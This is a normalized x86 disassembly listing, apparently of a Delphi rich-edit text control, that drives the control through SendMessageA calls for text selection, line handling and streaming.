push esi
push edi
add esp 0xffffff64
mov edi ecx
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_47a27c
mov eax edi
shl eax 0x2
lea eax [ eax + eax * 4 ]
xor edx edx
mov dl bl
mov [ esp + edx * 4 + 0x1c ] eax
mov [ esp + 0x4 ] 0x10
xor eax eax
mov al bl
cmp ax [ esp + 0x1a ]
jle r-xdata
mov edx esp
mov eax esi
call sub_47a2b0
add esp 0x9c
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x1a ] ax
sub_47a578
push ebx
push esi
push edi
push ebp
mov edi edx
mov esi eax
mov eax edi
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
mov edx edi
mov eax esi
call sub_416a84
mov ebx edi
mov eax ebx
call sub_47a314
mov edx eax
mov eax esi
call sub_47a330
mov eax ebx
call sub_47a3e8
mov edx eax
mov eax esi
call sub_47a408
mov eax ebx
call sub_47a444
mov edx eax
mov eax esi
call sub_47a464
mov eax ebx
call sub_47a4a0
mov edx eax
mov eax esi
call sub_47a4c0
mov eax ebx
call sub_47a36c
mov edx eax
mov eax esi
call sub_47a384
xor ebp ebp
mov ebx ebp
mov edx ebx
mov eax edi
call sub_47a4fc
mov ecx eax
mov edx ebx
mov eax esi
call sub_47a524
inc ebp
cmp ebp 0x20
jne r-xdata
jmp r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
sub_47a778
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov ecx [ eax + 0x250 ]
mov [ ebp - 0x10 ] ecx
mov ecx [ eax + 0x254 ]
mov [ ebp - 0xc ] ecx
xor ecx ecx
mov [ eax + 0x250 ] ecx
mov [ eax + 0x254 ] ecx
xor eax eax
push ebp
push sub_47a7e3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4175ec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47a7ea
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x250 ] edx
mov edx [ ebp - 0xc ]
mov [ eax + 0x254 ] edx
retn
sub_47a7f0
push ebx
push esi
mov ebx eax
push 0x0
push 0x0
push 0xba
mov eax [ ebx + 0x10 ]
call sub_448484
push eax
call SendMessageA
mov esi eax
push 0x0
push 0x0
mov eax esi
dec eax
push eax
push 0xbb
mov eax [ ebx + 0x10 ]
call sub_448484
push eax
call SendMessageA
push eax
push 0xc1
mov eax [ ebx + 0x10 ]
call sub_448484
push eax
call SendMessageA
test eax eax
jne r-xdata
mov eax esi
pop esi
pop ebx
retn
dec esi
sub_47a848
push ebx
push esi
push edi
add esp 0xfffff004
push eax
mov edi ecx
mov esi edx
mov ebx eax
mov eax esp
mov [ eax ] 0x1000
mov eax esp
push eax
push esi
push 0xc4
mov eax [ ebx + 0x10 ]
call sub_448484
push eax
call SendMessageA
cmp [ esp + eax - 0x2 ] 0xd
jne r-xdata
mov edx esp
mov ecx edi
xchg ecx eax
call sub_40451c
add esp 0x1000
pop edi
pop esi
pop ebx
retn
cmp [ esp + eax - 0x1 ] 0xa
jne r-xdata
sub eax 0x2
sub_47a89c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebp ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
push 0x0
push esi
push 0xbb
mov eax [ ebx + 0x10 ]
call sub_448484
push eax
call SendMessageA
mov edi eax
mov [ esp ] edi
inc edi
je r-xdata
push 0x0
mov eax [ esp + 0x4 ]
push eax
push 0xc1
mov eax [ ebx + 0x10 ]
call sub_448484
push eax
call SendMessageA
add eax [ esp ]
mov [ esp + 0x4 ] eax
mov eax esp
push eax
push 0x0
push 0x437
mov eax [ ebx + 0x10 ]
call sub_448484
push eax
call SendMessageA
mov eax ebp
call sub_4048dc
push eax
push 0x0
push 0xc2
mov eax [ ebx + 0x10 ]
call sub_448484
push eax
call SendMessageA
sub_47a928
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_47aa90
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47aa97
lea eax [ ebp - 0x20 ]
mov edx 0x2
call sub_404450
lea eax [ ebp - 0x10 ]
call sub_40442c
retn
push 0x0
push esi
push 0xbb
mov eax [ ebx + 0x10 ]
call sub_448484
push eax
call SendMessageA
mov edi eax
mov [ ebp - 0xc ] edi
test edi edi
jl r-xdata
push 0x0
dec esi
push esi
push 0xbb
mov eax [ ebx + 0x10 ]
call sub_448484
push eax
call SendMessageA
mov edi eax
mov [ ebp - 0xc ] edi
test edi edi
jl r-xdata
mov esi r-xdata
jmp r-xdata
push 0x0
mov eax [ ebp - 0xc ]
push eax
push 0xc1
mov eax [ ebx + 0x10 ]
call sub_448484
push eax
call SendMessageA
test eax eax
je r-xdata
mov eax [ ebp - 0xc ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0xc ]
push eax
push 0x0
push 0x437
mov eax [ ebx + 0x10 ]
call sub_448484
push eax
call SendMessageA
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x1c ]
mov edx esi
call sub_40461c
mov eax [ ebp - 0x1c ]
xor ecx ecx
pop edx
call sub_409730
mov eax [ ebp - 0x10 ]
call sub_4048dc
push eax
push 0x0
push 0xc2
mov eax [ ebx + 0x10 ]
call sub_448484
push eax
call SendMessageA
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0xcc ]
mov ebx eax
mov eax [ ebp - 0x10 ]
call sub_4046e4
add eax [ ebp - 0x8 ]
cmp ebx eax
je r-xdata
add [ ebp - 0xc ] eax
mov esi r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_406660
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bfa0
call sub_403e8c
sub_47aaad
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
add esp 0xfffffff8
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
push 0x0
push esi
push 0xbb
mov eax [ ebx + 0x10 ]
call sub_448484
push eax
call SendMessageA
mov edi eax
mov [ esp ] edi
inc edi
je r-xdata
push 0x0
inc esi
push esi
push 0xbb
mov eax [ ebx + 0x10 ]
call sub_448484
push eax
call SendMessageA
mov edi eax
mov [ esp + 0x4 ] edi
inc edi
jne r-xdata
mov eax esp
push eax
push 0x0
push 0x437
mov eax [ ebx + 0x10 ]
call sub_448484
push eax
call SendMessageA
mov eax [ rw-data ]
push eax
push 0x0
push 0xc2
mov eax [ ebx + 0x10 ]
call sub_448484
push eax
call SendMessageA
push 0x0
mov eax [ esp + 0x4 ]
push eax
push 0xc1
mov eax [ ebx + 0x10 ]
call sub_448484
push eax
call SendMessageA
add eax [ esp ]
mov [ esp + 0x4 ] eax
sub_47ab70
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov edi [ esi + 0x10 ]
cmp [ edi + 0x1a6 ] 0x0
je r-xdata
test bl bl
jne r-xdata
push 0x0
mov eax ebx
xor al 0x1
and eax 0x7f
push eax
push 0xb
mov eax edi
call sub_448484
push eax
call SendMessageA
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x10 ]
call sub_4422a0
push 0x0
xor ecx ecx
mov edx 0xb012
mov eax [ esi + 0x10 ]
call sub_442f30
sub_47abc0
push ebx
push esi
mov ebx [ eax + 0x10 ]
test dl dl
je r-xdata
push 0x0
push 0x0
push 0x43b
mov eax ebx
call sub_448484
push eax
call SendMessageA
mov esi eax
and esi 0xfffffffe
push 0x0
push 0x0
push 0x43b
mov eax ebx
call sub_448484
push eax
call SendMessageA
mov esi eax
or esi 0x1
jmp r-xdata
push esi
push 0x0
push 0x445
mov eax ebx
call sub_448484
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_47ac1c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_47abc0
xor eax eax
push ebp
push sub_47ac60
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_418138
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47ac67
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_47abc0
retn
sub_47ac6c
push esi
push edi
mov edi eax
mov esi edx
mov edx eax
cld
stosb [ edi ]
lea eax [ edi - 0x1 ]
sub eax edx
pop edi
pop esi
retn
cmp al 0xa
je r-xdata
mov eax 0xa0d
stosw [ edi ]
jmp r-xdata
stosb [ edi ]
cmp al 0xd
jne r-xdata
lodsb [ esi ]
mov al 0xa
stosb [ edi ]
lodsb [ esi ]
cmp al 0xa
je r-xdata
jmp r-xdata
or al al
je r-xdata
sub_47aca0
push ebp
mov ebp esp
push ebx
push esi
push edi
xor esi esi
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_47ace5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x14 ]
xor edx edx
mov [ eax ] edx
cmp [ ebx ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x10 ]
push eax
mov edx [ ebx + 0x4 ]
mov eax [ ebx ]
mov ecx [ ebp + 0xc ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
mov edx [ ebp + 0x14 ]
mov [ edx ] eax
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_47ad00
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov ebx [ ebp + 0x14 ]
mov esi [ ebp + 0x10 ]
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
lea eax [ esi + 0x1 ]
call sub_4091c8
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_47ade0
push [ fs : eax ]
mov [ fs : eax ] esp
sar esi 0x1
jns r-xdata
xor eax eax
mov [ ebx ] eax
mov eax [ ebp - 0x8 ]
add eax esi
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_47adb9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
cmp [ eax ] 0x0
je r-xdata
adc esi 0x0
cmp [ ebx ] 0x0
jle r-xdata
push esi
mov eax [ ebp - 0x10 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
mov ecx [ ebp - 0xc ]
mov esi [ eax ]
call [ esi ]
mov [ ebx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebx ]
mov edx [ ebp - 0xc ]
mov [ edx + eax ] 0x0
mov eax [ ebx ]
mov edx [ ebp - 0xc ]
cmp [ edx + eax - 0x1 ] 0xd
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47ade7
mov eax [ ebp - 0x8 ]
call sub_409214
retn
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_47ac6c
mov [ ebx ] eax
mov ecx [ ebx ]
mov edx [ ebp + 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4028fc
mov eax [ ebx ]
mov edx [ ebp - 0xc ]
mov [ edx + eax - 0x1 ] 0x0
sub_47adf4
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x20 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_47af47
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x25c ]
mov dl 0x1
call sub_403690
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov ebx 0x2
mov ebx 0x1
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_47af2a
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0xc ]
mov [ ebp - 0x1c ] eax
mov eax sub_47ad00
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
mov eax esi
call sub_4188e0
mov edi eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47af31
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
push ebx
push 0x449
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
call sub_448484
push eax
call SendMessageA
cmp ebx 0x2
jne r-xdata
retn
mov eax [ ebp - 0x10 ]
call sub_4036c0
mov eax edi
cdq
push edx
push eax
mov eax esi
call sub_418900
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov ebx 0x1
mov ebx 0x2
jmp r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_406660
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bfa0
call sub_403e8c
lea eax [ ebp - 0x1c ]
push eax
push ebx
push 0x449
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
call sub_448484
push eax
call SendMessageA
cmp [ ebp - 0x18 ] 0x0
je r-xdata
sub_47af58
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor ecx ecx
mov [ ebp - 0x20 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_47b059
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x25c ]
mov dl 0x1
call sub_403690
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov ebx 0x2
mov ebx 0x1
jmp r-xdata
mov [ ebp - 0x8 ] ebx
mov eax [ ebp - 0x10 ]
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_47b03c
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0xc ]
mov [ ebp - 0x1c ] eax
mov eax sub_47aca0
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47b043
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_406660
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bfa0
call sub_403e8c
lea eax [ ebp - 0x1c ]
push eax
push ebx
push 0x44a
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
call sub_448484
push eax
call SendMessageA
cmp [ ebp - 0x18 ] 0x0
je r-xdata
retn
mov eax [ ebp - 0x10 ]
call sub_4036c0
sub_47b068
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_47b161
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov eax edi
call sub_408ed4
mov eax [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
call sub_40cb7c
lea eax [ ebp - 0x8 ]
mov ecx 0x1
mov edx 0x1
call sub_40497c
mov ebx [ rw-data ]
test ebx ebx
je r-xdata
test ebx ebx
jne r-xdata
mov esi ebx
mov eax [ esi + 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_404828
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov ebx rw-data
mov ebx [ esi + 0x8 ]
test ebx ebx
jne r-xdata
xor eax eax
push ebp
push sub_47b111
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_417d68
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebx ]
mov dl 0x1
call sub_403690
mov edx [ ebp - 0x4 ]
mov [ edx + 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx 0x7ffffff0
mov ecx [ eax ]
call [ ecx + 0xc4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47b168
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_404450
retn
sub_47b116
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
call sub_4036c0
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x18 ] edx
call sub_403eb4
call sub_403f08
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx 0x7ffffff0
mov ecx [ eax ]
call [ ecx + 0xc4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47b168
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_404450
retn
sub_47b170
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_47b256
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov eax edi
call sub_408ed4
mov eax [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
call sub_40cb7c
lea eax [ ebp - 0x8 ]
mov ecx 0x1
mov edx 0x1
call sub_40497c
mov ebx [ rw-data ]
test ebx ebx
je r-xdata
test ebx ebx
jne r-xdata
mov esi ebx
mov eax [ esi + 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_404828
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov ebx rw-data
mov ebx [ esi + 0x8 ]
test ebx ebx
jne r-xdata
xor eax eax
push ebp
push j_sub_403ba0#2
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_417ffc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebx ]
mov dl 0x1
call sub_403690
mov edx [ ebp - 0x4 ]
mov [ edx + 0x18 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47b25d
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_404450
retn
sub_47b21e
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
call sub_4036c0
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x18 ] edx
call sub_403eb4
call sub_403f08
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47b25d
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_404450
retn
sub_47b264
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_4327b8
push 0x0
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_479c28
mov [ ebx + 0x234 ] eax
push 0x1
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_479c28
mov [ ebx + 0x238 ] eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_47a224
mov [ ebx + 0x23c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov esi eax
mov [ ebx + 0x248 ] esi
mov [ esi + 0x10 ] ebx
mov dl 0x1
mov eax ebx
call sub_4486b8
mov edx 0xb9
mov eax ebx
call sub_441520
mov edx 0x59
mov eax ebx
call sub_441544
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov [ ebx + 0x1f8 ] 0x0
mov [ ebx + 0x258 ] 0x1
mov dl 0x1
mov eax ebx
call sub_47b91c
push 0x0
call GetDC
mov esi eax
push 0x5a
push esi
call GetDeviceCaps
mov [ ebx + 0x244 ] eax
mov eax [ r-xdata ]
mov [ ebx + 0x25c ] eax
push esi
push 0x0
call ReleaseDC
mov al [ ebx + 0x224 ]
mov [ ebx + 0x240 ] al
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_442f30
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_47b380
push ebx
push esi
call sub_403a8c
mov ebx edx
mov esi eax
mov eax [ esi + 0x234 ]
call sub_4036c0
mov eax [ esi + 0x238 ]
call sub_4036c0
mov eax [ esi + 0x23c ]
call sub_4036c0
mov eax [ esi + 0x248 ]
call sub_4036c0
mov eax [ esi + 0x24c ]
call sub_4036c0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_43283c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403a74
sub_47b3f4
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
mov edx esi
mov eax ebx
call sub_43286c
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_44530c
mov eax [ esi + 0x4 ]
xor edx edx
mov dl [ ebx + 0x230 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x258 ]
or eax [ edx * 4 + rw-data ]
mov [ esi + 0x4 ] eax
and [ esi + 0x24 ] 0xfffffffc
pop esi
pop ebx
retn
push r-xdata
call LoadLibraryA
mov [ rw-data ] eax
cmp [ rw-data ] 0x20
ja r-xdata
xor eax eax
mov [ rw-data ] eax
sub_47b471
add [ eax ] al
add [ edx + 0x49 ] dl
inc ebx
dec eax
inc ebp
inc esp
dec ecx
push esp
add [ eax ] al
add [ eax ] al
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_431b98
mov [ ebp - 0x7 ] al
mov eax [ ebp - 0x4 ]
call sub_43205c
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
push 0x2c0001
push 0x0
push 0x445
mov eax [ ebp - 0x4 ]
call sub_448484
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x70 ]
call sub_421054
push eax
push 0x0
push 0x443
mov eax [ ebp - 0x4 ]
call sub_448484
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24c ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x11
je r-xdata
mov dl [ ebp - 0x7 ]
mov eax [ ebp - 0x4 ]
call sub_431bd0
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_47b9bc
mov [ ebp - 0x5 ] al
lea edx [ ebp - 0x6 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24c ]
mov ecx 0x1
call sub_418b0c
mov dl [ ebp - 0x6 ]
mov eax [ ebp - 0x4 ]
call sub_47b9c8
xor eax eax
push ebp
push sub_47b592
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x24c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24c ]
call sub_4036c0
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x24c ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov dl [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
call sub_47b9c8
retn
call sub_4285b4
mov edx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
call sub_421844
sub_47b5a8
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_431b98
mov edx [ ebp - 0x4 ]
mov [ edx + 0x259 ] al
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov edx [ ebp - 0x4 ]
mov [ edx + 0x24c ] eax
mov eax [ ebp - 0x4 ]
call sub_47b9bc
mov [ ebp - 0x5 ] al
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
setne al
mov [ ebp - 0x6 ] al
mov dl [ ebp - 0x6 ]
mov eax [ ebp - 0x4 ]
call sub_47b9c8
lea edx [ ebp - 0x6 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24c ]
mov ecx 0x1
call sub_418b44
xor eax eax
push ebp
push sub_47b660
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x24c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
mov ecx [ eax ]
call [ ecx + 0x78 ]
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24c ]
call sub_418900
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47b667
mov dl [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
call sub_47b9c8
retn
sub_47b68c
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x5
jge r-xdata
mov edx esi
mov eax ebx
call sub_443790
add esp 0x10
pop esi
pop ebx
retn
lea edx [ esp + 0x8 ]
mov eax [ esi + 0x8 ]
call sub_407494
lea edx [ esp + 0x8 ]
mov ecx esp
mov eax ebx
call sub_44187c
mov eax esp
call sub_4074a8
push eax
mov eax ebx
call sub_448484
mov ecx eax
mov edx 0x7b
mov eax ebx
call sub_442f30
sub_47b6f4
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push 0x0
push 0x435
mov eax ebx
call sub_448484
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_47b714
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax esp
push eax
push 0x0
push 0x434
mov eax ebx
call sub_448484
push eax
call SendMessageA
mov eax [ esp + 0x4 ]
mov [ esi ] eax
mov eax [ esi ]
push eax
push 0x0
push 0x436
mov eax ebx
call sub_448484
push eax
call SendMessageA
mov [ esi + 0x4 ] eax
push 0x0
push 0xffffffff
push 0xbb
mov eax ebx
call sub_448484
push eax
call SendMessageA
sub [ esi ] eax
pop ecx
pop edx
pop esi
pop ebx
retn
sub_47b774
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi edx
mov ebx eax
push 0x0
mov eax [ esi + 0x4 ]
push eax
push 0xbb
mov eax ebx
call sub_448484
push eax
call SendMessageA
mov edi eax
add edi [ esi ]
mov [ esp ] edi
mov [ esp + 0x4 ] edi
mov eax esp
push eax
push 0x0
push 0x437
mov eax ebx
call sub_448484
push eax
call SendMessageA
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_47b7c0
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax esp
push eax
push 0x0
push 0x434
mov eax ebx
call sub_448484
push eax
call SendMessageA
mov eax [ esp + 0x4 ]
sub eax [ esp ]
pop ecx
pop edx
pop ebx
retn
sub_47b7e8
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax esp
push eax
push 0x0
push 0x434
mov eax ebx
call sub_448484
push eax
call SendMessageA
mov eax [ esp ]
pop ecx
pop edx
pop ebx
retn
sub_47b80c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_47b870
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov eax [ ebp - 0x4 ]
call sub_4046e4
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4046e4
cmp esi eax
jg r-xdata
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_409078
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47b877
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
mov ebx esi
dec ebx
sub_47b880
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
mov edx eax
inc edx
mov eax esi
call sub_404a68
mov eax [ esi ]
call sub_4048dc
push eax
push 0x0
push 0x43e
mov eax ebx
call sub_448484
push eax
call SendMessageA
mov edx esi
